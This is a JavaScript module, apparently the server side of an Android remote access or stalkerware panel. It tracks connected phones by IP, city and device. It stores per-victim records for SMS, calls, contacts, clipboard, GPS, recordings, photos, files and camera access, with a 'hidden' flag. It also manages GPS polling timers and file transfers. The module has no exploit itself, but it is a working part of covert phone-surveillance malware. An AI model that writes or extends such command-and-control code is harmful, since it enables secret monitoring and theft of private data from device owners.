// Client Connection Module

import db from '../database/db.js';
import { logger } from '../logs/logs.js';

const connect = async (sockets, id, data) => {
    try {
        if (sockets.has && sockets.set) {
            sockets.set(id, data.socket);
        } else {
            sockets[id] = data.socket;
        }
        
        const now = new Date().toISOString();
        let client = await db.repository.get(id);
        
        if (client) {
            client.connection = {
                ...client.connection,
                ip: data.ip || client.connection.ip,
                country: data.country || client.connection.country,
                city: data.city || client.connection.city,
                timezone: data.timezone || client.connection.timezone,
                lastSeen: now,
                online: true,
                reconnectCount: (client.connection.reconnectCount || 0) + 1
            };
            
            if (data.device) {
                client.device = { ...client.device, ...data.device };
            }
            client.lastUpdated = now;
        } else {
            client = {
                id,
                connection: {
                    ip: data.ip || '',
                    country: data.country || '',
                    city: data.city || '',
                    timezone: data.timezone || '',
                    firstSeen: now,
                    lastSeen: now,
                    online: true,
                    reconnectCount: 0
                },
                device: data.device || { model: 'Unknown', brand: 'Unknown', version: 'Unknown' },
                data: {},
                state: {},
                sms: [],
                calls: [],
                contacts: [],
                wifi: [],
                clipboard: [],
                notifications: [],
                permissions: [],
                apps: [],
                gps: [],
                downloads: [],
                recordings: [],
                files: [],
                photos: [],
                currentPath: '',
                cameras: [],
                cameraPermission: false,
                deviceInfo: null,
                fasonHidden: false,
                lastUpdated: now
            };
        }
        
        await db.repository.save(id, client);
        logger.clientConnected(id, data.ip, data.device);
        return true;
    } catch (e) {
        logger.systemError('Client connect failed', e);
        return false;
    }
};

const disconnect = async (sockets, gpsTimers, transfers, id) => {
    try {
        const client = await db.repository.get(id);
        if (client) {
            client.connection = {
                ...client.connection,
                online: false,
                lastSeen: new Date().toISOString()
            };
            client.lastUpdated = new Date().toISOString();
            await db.repository.save(id, client);
        }
        
        if (sockets.has && sockets.delete) {
            sockets.delete(id);
        } else {
            delete sockets[id];
        }
        
        if (gpsTimers.has && gpsTimers.get) {
            const timer = gpsTimers.get(id);
            if (timer) {
                clearInterval(timer);
                gpsTimers.delete(id);
            }
        } else if (gpsTimers[id]) {
            clearInterval(gpsTimers[id]);
            delete gpsTimers[id];
        }
        
        if (transfers.has && transfers.forEach) {
            for (const [tid] of transfers) {
                if (tid.startsWith(id)) transfers.delete(tid);
            }
        } else {
            Object.keys(transfers).forEach(tid => {
                if (tid.startsWith(id)) delete transfers[tid];
            });
        }
        
        logger.clientDisconnected(id);
        return true;
    } catch (e) {
        logger.systemError('Client disconnect failed', e);
        return false;
    }
};

const get = async (id) => {
    const client = await db.repository.get(id);
    if (!client) return null;
    
    return {
        id: client.id,
        ip: client.connection?.ip || '',
        country: client.connection?.country || '',
        city: client.connection?.city || '',
        timezone: client.connection?.timezone || '',
        device: client.device || {},
        firstSeen: client.connection?.firstSeen || '',
        lastSeen: client.connection?.lastSeen || '',
        online: client.connection?.online || false,
        reconnectCount: client.connection?.reconnectCount || 0
    };
};

const getSync = (id) => {
    const clientDb = db.getClient(id);
    if (!clientDb) return null;
    return clientDb.value();
};

const online = async () => {
    const ids = db.repository.getAllIds();
    const result = [];
    
    for (const id of ids) {
        const client = await db.repository.get(id);
        if (client?.connection?.online) {
            result.push({
                id: client.id,
                ip: client.connection.ip,
                country: client.connection.country,
                city: client.connection.city,
                device: client.device,
                lastSeen: client.connection.lastSeen
            });
        }
    }
    return result;
};

const offline = async () => {
    const ids = db.repository.getAllIds();
    const result = [];
    
    for (const id of ids) {
        const client = await db.repository.get(id);
        if (client && !client.connection?.online) {
            result.push({
                id: client.id,
                ip: client.connection.ip,
                country: client.connection.country,
                city: client.connection.city,
                device: client.device,
                lastSeen: client.connection.lastSeen
            });
        }
    }
    return result;
};

const all = async () => {
    const ids = db.repository.getAllIds();
    const result = [];
    
    for (const id of ids) {
        const client = await db.repository.get(id);
        if (client) {
            result.push({
                id: client.id,
                ip: client.connection?.ip || '',
                country: client.connection?.country || '',
                city: client.connection?.city || '',
                device: client.device || {},
                firstSeen: client.connection?.firstSeen || '',
                lastSeen: client.connection?.lastSeen || '',
                online: client.connection?.online || false,
                reconnectCount: client.connection?.reconnectCount || 0
            });
        }
    }
    return result;
};

const onlineCount = async () => {
    const ids = db.repository.getAllIds();
    let count = 0;
    for (const id of ids) {
        const client = await db.repository.get(id);
        if (client?.connection?.online) count++;
    }
    return count;
};

const isOnline = async (id) => {
    const client = await db.repository.get(id);
    return client?.connection?.online || false;
};

const connection = {
    connect,
    disconnect,
    get,
    getSync,
    online,
    offline,
    all,
    onlineCount,
    isOnline
};

export default connection;

export {
    connect,
    disconnect,
    get,
    getSync,
    online,
    offline,
    all,
    onlineCount,
    isOnline
};
